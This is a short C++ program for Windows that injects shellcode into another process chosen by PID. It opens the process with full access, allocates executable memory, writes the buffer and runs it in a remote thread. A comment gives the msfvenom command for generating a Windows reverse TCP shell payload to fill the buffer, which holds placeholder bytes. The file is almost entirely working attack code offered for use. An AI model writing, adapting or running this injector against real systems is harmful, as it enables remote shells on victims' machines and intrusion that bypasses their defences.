#include <Windows.h>
#include <iostream>

int main(int argc, char* argv[]) {
    
	if (argc < 2) {
		std::cout << "Usage: " << argv[0] << " <PID>\n";
		return 1;
	}

	//msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -v shellcode
	unsigned char shellcode[] = "\xaa\xbb\xcc\xdd";

	DWORD pid = atoi(argv[1]);

	std::cout << "[*] Open Process Handle" << pid << std::endl;

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

	if (hProcess == NULL) {
		std::cout << "[-] Open Process Error: 0x" << std::hex << GetLastError() << std::endl;	
		return EXIT_FAILURE;
	}

	std::cout << "[+] Get Process Handle: 0x" << std::hex << hProcess << std::endl;

	LPVOID pAddress = VirtualAllocEx(hProcess, nullptr, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	if (pAddress == NULL) {
		std::cout << "[-] Failed to allocate memory" << std::endl;
		return EXIT_FAILURE;
	}

	std::cout << "[+] Allocated " << sizeof shellcode << " bytes for PID: " << pid << std::endl;

	if (!WriteProcessMemory(hProcess, pAddress, shellcode, sizeof shellcode, nullptr)) {
		std::cout << "[-] Failed to write shellcode to memory" << std::endl;
		return EXIT_FAILURE;
	}
	
	std::cout << "[+] wrote shellcode to allocated buffer" << std::endl;

	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pAddress, nullptr, 0, nullptr);

	if (hThread == nullptr) {
		std::cout << "[-] Failed to get a new handle: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	std::cout << "[+] Got a handle for a new thread: 0x" << std::hex << hThread << "---0x" << std::hex << hProcess << std::endl;

	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	std::cout << "[+] Done!" << std::endl;

	return EXIT_SUCCESS;
}
